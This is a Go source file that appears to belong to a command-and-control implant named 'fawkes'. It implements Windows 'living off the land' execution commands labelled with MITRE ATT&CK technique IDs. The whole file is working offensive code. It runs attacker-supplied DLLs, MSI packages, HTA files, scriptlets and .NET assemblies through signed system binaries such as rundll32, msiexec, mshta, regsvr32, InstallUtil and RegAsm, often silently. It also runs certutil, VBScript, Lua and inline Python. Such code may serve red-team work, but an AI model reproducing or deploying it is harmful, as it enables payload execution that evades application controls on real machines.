//go:build windows
// +build windows

package commands

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// lolbinRundll32 — T1218.011 — Execute DLL exports via rundll32.exe
func lolbinRundll32(dllPath, export, extraArgs string) structs.CommandResult {
	if export == "" {
		export = "DllMain"
	}

	cmdArgs := fmt.Sprintf("%s,%s", dllPath, export)
	if extraArgs != "" {
		cmdArgs += " " + extraArgs
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "rundll32.exe", cmdArgs)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] rundll32.exe %s\n", cmdArgs)
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinMsiexec — T1218.007 — Execute via MSI package
func lolbinMsiexec(msiPath, extraArgs string) structs.CommandResult {
	cmdArgs := []string{"/i", msiPath, "/qn"}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "msiexec.exe", cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] msiexec.exe %s\n", strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinRegsvcs — T1218.009 — .NET COM registration via regsvcs.exe
func lolbinRegsvcs(dllPath, extraArgs string) structs.CommandResult {
	cmdArgs := []string{dllPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	regsvcsPath := findDotNetTool("RegSvcs.exe")
	if regsvcsPath == "" {
		return errorResult("Error: RegSvcs.exe not found in .NET Framework directories")
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, regsvcsPath, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] %s %s\n", regsvcsPath, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinRegasm — T1218.009 — .NET assembly registration via regasm.exe
func lolbinRegasm(dllPath, extraArgs string) structs.CommandResult {
	cmdArgs := []string{dllPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	regasmPath := findDotNetTool("RegAsm.exe")
	if regasmPath == "" {
		return errorResult("Error: RegAsm.exe not found in .NET Framework directories")
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, regasmPath, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] %s %s\n", regasmPath, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinMshta — T1218.005 — Execute HTA/JS via mshta.exe
func lolbinMshta(htaPath, extraArgs string) structs.CommandResult {
	cmdArgs := []string{htaPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "mshta.exe", cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] mshta.exe %s\n", strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinCertutil — T1218 — Decode/download via certutil.exe
func lolbinCertutil(filePath, extraArgs string) structs.CommandResult {
	outPath := strings.TrimSuffix(filePath, filepath.Ext(filePath)) + ".decoded"
	cmdArgs := []string{"-decode", filePath, outPath}
	if extraArgs != "" {
		cmdArgs = strings.Fields(extraArgs)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "certutil.exe", cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] certutil.exe %s\n", strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinRegsvr32 — T1218.010 — Execute DLL/scriptlet via regsvr32.exe
func lolbinRegsvr32(payloadPath, extraArgs string) structs.CommandResult {
	var cmdArgs []string

	if extraArgs != "" {
		cmdArgs = strings.Fields(extraArgs)
		found := false
		for _, a := range cmdArgs {
			if strings.Contains(a, payloadPath) {
				found = true
				break
			}
		}
		if !found {
			cmdArgs = append(cmdArgs, payloadPath)
		}
	} else {
		cmdArgs = []string{"/s", payloadPath}
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "regsvr32.exe", cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] regsvr32.exe %s\n", strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinInstallUtil — T1218.004 — Execute .NET assembly via InstallUtil.exe
func lolbinInstallUtil(assemblyPath, extraArgs string) structs.CommandResult {
	installUtilPath := findDotNetTool("InstallUtil.exe")
	if installUtilPath == "" {
		return errorResult("Error: InstallUtil.exe not found in .NET Framework directories")
	}

	cmdArgs := []string{"/logfile=", "/LogToConsole=false"}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}
	cmdArgs = append(cmdArgs, assemblyPath)

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, installUtilPath, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] %s %s\n", installUtilPath, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinVBS — T1059.005 — Execute VBScript via cscript.exe or wscript.exe
func lolbinVBS(scriptPath, extraArgs string) structs.CommandResult {
	interpreter := "cscript.exe"
	if _, err := exec.LookPath(interpreter); err != nil {
		interpreter = "wscript.exe"
	}

	cmdArgs := []string{"//Nologo", scriptPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] VBScript execution via %s\n    Script: %s\n", interpreter, scriptPath)
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinLua — T1059 — Execute Lua script via lua interpreter
func lolbinLua(scriptPath, extraArgs string) structs.CommandResult {
	var interpreter string
	for _, name := range []string{"lua", "lua5.4", "lua5.3", "lua5.1", "luajit"} {
		if p, err := exec.LookPath(name); err == nil {
			interpreter = p
			break
		}
	}
	if interpreter == "" {
		return errorResult("Error: no Lua interpreter found (lua, lua5.4, lua5.3, lua5.1, luajit)")
	}

	cmdArgs := []string{scriptPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] Lua execution via %s\n    Script: %s\n", interpreter, scriptPath)
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lolbinPython — T1059.006 — Execute Python code inline or from script file
func lolbinPython(code, extraArgs string) structs.CommandResult {
	var interpreter string
	for _, name := range []string{"python3", "python", "python3.exe", "python.exe"} {
		if p, err := exec.LookPath(name); err == nil {
			interpreter = p
			break
		}
	}
	if interpreter == "" {
		return errorResult("Error: python3/python not found on this system")
	}

	if code == "" && extraArgs == "" {
		return errorResult("Error: provide code in 'path' field or script path in 'args' field")
	}

	var cmdArgs []string
	if code != "" {
		cmdArgs = []string{"-c", code}
		if extraArgs != "" {
			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
		}
	} else {
		cmdArgs = strings.Fields(extraArgs)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] Python execution via %s\n    %s %s\n", interpreter, interpreter, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// findDotNetTool searches for .NET Framework tools in standard locations
func findDotNetTool(toolName string) string {
	frameworkDir := `C:\Windows\Microsoft.NET\Framework64`
	entries, err := os.ReadDir(frameworkDir)
	if err != nil {
		frameworkDir = `C:\Windows\Microsoft.NET\Framework`
		entries, err = os.ReadDir(frameworkDir)
		if err != nil {
			return ""
		}
	}

	for i := len(entries) - 1; i >= 0; i-- {
		if !entries[i].IsDir() {
			continue
		}
		toolPath := filepath.Join(frameworkDir, entries[i].Name(), toolName)
		if _, err := os.Stat(toolPath); err == nil {
			return toolPath
		}
	}
	return ""
}
